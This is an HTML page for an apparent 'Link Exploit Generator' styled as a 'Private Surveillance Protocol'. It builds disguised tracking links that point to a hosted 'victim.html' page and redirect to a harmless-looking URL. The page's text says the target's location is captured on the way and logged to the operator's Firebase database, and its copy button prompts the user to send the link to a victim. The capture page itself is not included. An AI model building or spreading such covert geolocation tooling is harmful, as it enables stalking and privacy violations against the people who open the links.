<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Link Exploit Generator | CyberCore</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        .cyber-card { background: rgba(255, 255, 255, 0.9); backdrop-filter: blur(10px); border: 1px solid #f0f0f0; }
        .glow-input:focus { border-color: #22c55e; box-shadow: 0 0 15px rgba(34, 197, 94, 0.2); }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .animate-in { animation: fadeIn 0.5s ease forwards; }
    </style>
</head>
<body class="bg-[#f0f2f5] min-h-screen flex flex-col items-center justify-center p-4">

    <div class="w-full max-w-xl mb-6 flex items-center justify-between">
        <button onclick="location.href='dashboard.html'" class="bg-white p-3 rounded-2xl shadow-sm text-gray-500 hover:text-green-600 transition">
            <i class="fa-solid fa-chevron-left"></i>
        </button>
        <h1 class="text-xl font-black text-gray-800 italic uppercase tracking-tighter">Link <span class="text-green-600">Generator</span></h1>
        <div class="w-10"></div> </div>

    <div class="cyber-card w-full max-w-xl rounded-[2.5rem] shadow-2xl overflow-hidden animate-in">
        <div class="bg-gray-900 p-8 text-center">
            <div class="h-20 w-20 bg-green-500/10 rounded-3xl flex items-center justify-center mx-auto mb-4 border border-green-500/20">
                <i class="fa-solid fa-link-slash text-3xl text-green-500"></i>
            </div>
            <p class="text-[10px] font-black text-green-500 tracking-[0.3em] uppercase">Private Surveillance Protocol</p>
        </div>

        <div class="p-8 space-y-6">
            <div>
                <label class="block text-[10px] font-black text-gray-400 uppercase mb-2 ml-1 tracking-widest">Target Redirect URL</label>
                <div class="relative">
                    <i class="fa-solid fa-share-from-square absolute left-4 top-4 text-gray-400"></i>
                    <input type="text" id="redirectUrl" placeholder="https://www.youtube.com/watch?v=..." 
                           class="w-full p-4 pl-12 bg-gray-50 border border-gray-200 rounded-2xl outline-none glow-input transition-all font-medium text-sm">
                </div>
                <p class="text-[9px] text-gray-400 mt-2 italic px-1">Victim will be redirected to this link after capturing their coordinates.</p>
            </div>

            <button onclick="generateSecureLink()" class="w-full bg-gray-900 hover:bg-black text-white font-black py-4 rounded-2xl shadow-xl transition-all uppercase tracking-widest text-sm active:scale-95">
                Generate Tracking Link
            </button>

            <div id="resultBox" class="hidden space-y-4 pt-4 border-t border-dashed border-gray-200">
                <div class="p-5 bg-green-50 rounded-3xl border-2 border-dashed border-green-200 relative group">
                    <p class="text-[10px] font-black text-green-600 mb-2 uppercase tracking-tighter">Your Encrypted Exploit URL:</p>
                    <p id="finalLink" class="text-xs font-mono font-bold text-gray-700 break-all leading-relaxed pr-8">--</p>
                    <button onclick="copyToClipboard()" class="absolute right-4 top-10 text-green-600 hover:scale-110 transition">
                        <i class="fa-solid fa-copy text-xl"></i>
                    </button>
                </div>
                
                <div class="bg-blue-50 p-4 rounded-2xl border border-blue-100 flex items-start space-x-3">
                    <i class="fa-solid fa-circle-info text-blue-500 mt-1"></i>
                    <p class="text-[10px] text-blue-700 font-bold leading-normal">
                        This link is bound to your ID. Any location captured will appear instantly in your Tracking Logs table.
                    </p>
                </div>
            </div>
        </div>
    </div>

    <script>
        // --- FIREBASE CONFIG ---
        const firebaseConfig = {
            apiKey: "YOUR_API_KEY",
            authDomain: "YOUR_PROJECT.firebaseapp.com",
            databaseURL: "YOUR_DATABASE_URL",
            projectId: "YOUR_PROJECT_ID",
            storageBucket: "YOUR_PROJECT.appspot.com",
            messagingSenderId: "YOUR_ID",
            appId: "YOUR_APP_ID"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        const userMobile = localStorage.getItem("loggedInUser");

        function generateSecureLink() {
            const redirect = document.getElementById('redirectUrl').value;
            const resBox = document.getElementById('resultBox');
            const linkDisplay = document.getElementById('finalLink');

            if(!redirect || !redirect.startsWith('http')) {
                alert("Please enter a valid destination URL (starting with http:// or https://)");
                return;
            }

            // --- GITHUB HOSTING DETAILS ---
            // Yahan aapko apni GitHub Pages ki victim.html file ka link daalna hai
            const githubPage = "https://your-github-username.github.io/your-repo-name/victim.html";
            
            // Generate link with ID and Encoded Redirect
            const encodedRedirect = btoa(redirect); // Base64 Encoding
            const trackingLink = `${githubPage}?id=${userMobile}&r=${encodedRedirect}`;

            linkDisplay.innerText = trackingLink;
            resBox.classList.remove('hidden');
            resBox.classList.add('animate-in');
        }

        function copyToClipboard() {
            const text = document.getElementById('finalLink').innerText;
            navigator.clipboard.writeText(text).then(() => {
                alert("Tracking link copied! Send this to your victim.");
            });
        }
    </script>
</body>
</html>
